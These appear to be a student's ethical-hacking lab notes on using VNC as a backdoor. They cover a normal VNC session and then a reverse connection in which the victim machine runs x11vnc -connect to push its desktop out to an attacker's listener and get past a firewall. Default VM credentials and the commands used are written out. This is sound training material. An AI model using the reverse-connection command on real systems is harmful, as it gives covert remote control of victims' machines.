# Lab 16: VNC as a Backdoor — Study Notes

> **Course:** NDG Ethical Hacking V2  
> **Topic:** Using VNC for remote access and firewall bypass via reverse connection  
> **Tools Used:** TightVNC, x11vnc, vncviewer, pfSense  

---

## 1. Environment Overview

### Network Topology

```
[OpenSUSE]                          [Kali Linux]
192.168.0.30                        192.168.9.2
     |                                   |
   LAN (192.168.0.0/24)    [pfSense]   WAN (192.168.9.0/24)
                          .254     .1
```

| Virtual Machine | IP Address | Role |
|---|---|---|
| Kali Linux | 192.168.9.2 / 192.168.0.2 | Attacker (outside firewall) |
| OpenSUSE | 192.168.0.30 | Victim (inside firewall) |
| pfSense | 192.168.0.254 / 192.168.9.1 | Firewall/Router |

---

## 2. Key Concepts

### What is VNC?
- **VNC = Virtual Network Computing**
- Developed in the late 1990s at AT&T Research Labs (UK)
- Allows remote control of another computer's desktop over a network
- Works by transmitting screen image from server → client and keyboard/mouse input from client → server

### VNC Variants Used in This Lab

| Tool | Description |
|---|---|
| **TightVNC** | Compressed VNC — "tight" compression for faster transmission |
| **TigerVNC** | Security-enhanced VNC (used as the vncserver backend here) |
| **x11vnc** | Shares the actual live X11 display of a Linux machine |
| **vncviewer** | Client-side viewer to connect to a VNC server |

### What is osboxes?
- **osboxes = OS + boxes** → pre-built virtual machine images from osboxes.org
- The OpenSUSE VM in this lab was sourced from osboxes.org
- Default credentials: username `osboxes`, password `osboxes.org`

### Port Mapping
- VNC display `:1` → Port **5901**
- VNC display `:2` → Port **5902**
- Reverse VNC listener → Port **5500** (default)

---

## 3. Part 1 — Standard VNC Connection

### Concept
Normal direction: **Attacker (Kali) connects TO Victim (OpenSUSE)**

```
Kali ──────────────────────────► OpenSUSE
       (initiates connection)      (VNC server running)
```

**Problem:** This direction is blocked by the firewall in a real-world scenario.

### Steps on OpenSUSE (Victim)

```bash
su                          # Escalate to root
# Password: osboxes.org

vncserver :2                # Start VNC server on display :2 (port 5902)
vncserver -list             # Verify server is running
```

**Output of `vncserver -list`:**
```
TigerVNC server sessions:
X DISPLAY #    PROCESS ID
:2             2423
```
→ VNC server is running on display `:2`, process ID 2423

### Steps on Kali (Attacker)

```bash
vncviewer                   # Launch VNC viewer
# Enter server: 192.168.0.30:5902
# Enter password: osboxes.org
```

**Result:** Kali successfully views and controls the OpenSUSE desktop remotely.

---

## 4. Part 2 — Reverse VNC Connection (Firewall Bypass)

### Concept
**The key insight:** Firewalls typically block inbound connections but allow outbound connections.

Reverse direction: **Victim (OpenSUSE) connects OUT to Attacker (Kali)**

```
OpenSUSE ──────────────────────► Kali
         (initiates connection)   (listening for incoming)
         ✅ Outbound = ALLOWED by firewall
```

This is the backdoor technique — the victim machine reaches out, so the firewall doesn't block it.

### Steps on OpenSUSE (Victim)

```bash
# Step 1: Kill the existing VNC server from Part 1
vncserver -kill :2

# Step 2: Navigate to x11vnc location
cd /usr/bin

# Step 3: Connect OUT to the attacker's listener
./x11vnc -connect 192.168.9.2:5500
```

`-connect` tells x11vnc to **push** the desktop to the attacker rather than wait to be pulled.

### Steps on Kali (Attacker)

```bash
# Before OpenSUSE connects — set up listener
vncviewer -listen 0
# Output: vncviewer -listen: Listening on port 5500
```

`-listen 0` puts vncviewer into **passive listening mode** on port 5500, waiting for an incoming reverse connection.

### Log Output Analysis (x11vnc on OpenSUSE)

```
Making connection to client on host 192.168.9.2 port 5500
→ OpenSUSE is reaching out to Kali

reverse_connect: 192.168.9.2:5500/192.168.9.2 OK
→ Reverse connection established successfully!

incr accepted_client=1 for 192.168.9.2:5500
→ Kali accepted as a client

Client Protocol Version 3.8
→ VNC protocol version negotiated

Using compression level 1 / image quality level 6
→ Display stream configured

client 1 network rate: 9865.1 KB/sec, latency: 0.5 ms
→ Connection performance metrics
```

**Result:** Tab `TightVNC: osboxes:0` appears on Kali → Kali now sees OpenSUSE's **live desktop** in real time, bypassing the firewall.

---

## 5. Normal vs Reverse Connection — Summary

| | Normal VNC | Reverse VNC |
|---|---|---|
| Who initiates? | Attacker → Victim | Victim → Attacker |
| Firewall | ❌ Blocks inbound | ✅ Allows outbound |
| Attacker role | Active (connect) | Passive (listen) |
| Victim role | Passive (serve) | Active (push) |
| Command (attacker) | `vncviewer <IP>` | `vncviewer -listen 0` |
| Command (victim) | `vncserver :2` | `./x11vnc -connect <IP>:5500` |

---

## 6. Security Implications

- **Reverse connections are a classic backdoor technique** used by both malware and penetration testers
- Many firewalls do not inspect or restrict outbound connections by default
- The x11vnc warning `YOU ARE RUNNING X11VNC WITHOUT A PASSWORD!!` highlights that running without authentication makes the machine accessible to anyone on the network
- In real attacks, this technique is often combined with:
  - Persistence mechanisms (auto-run on startup)
  - Encryption tunnels to avoid detection
  - Social engineering to execute the initial payload

---

## 7. Certifications This Lab Aligns To

| Certification | Domain |
|---|---|
| CEH v10 | Malware Threats, Session Hijacking, Denial-of-Service |
| CompTIA PenTest+ | Exploit local host vulnerabilities, Post-exploitation techniques |

---

*Lab completed: 2026-06-22*  
*Environment: NDG NETLAB+ / Holmesglen*
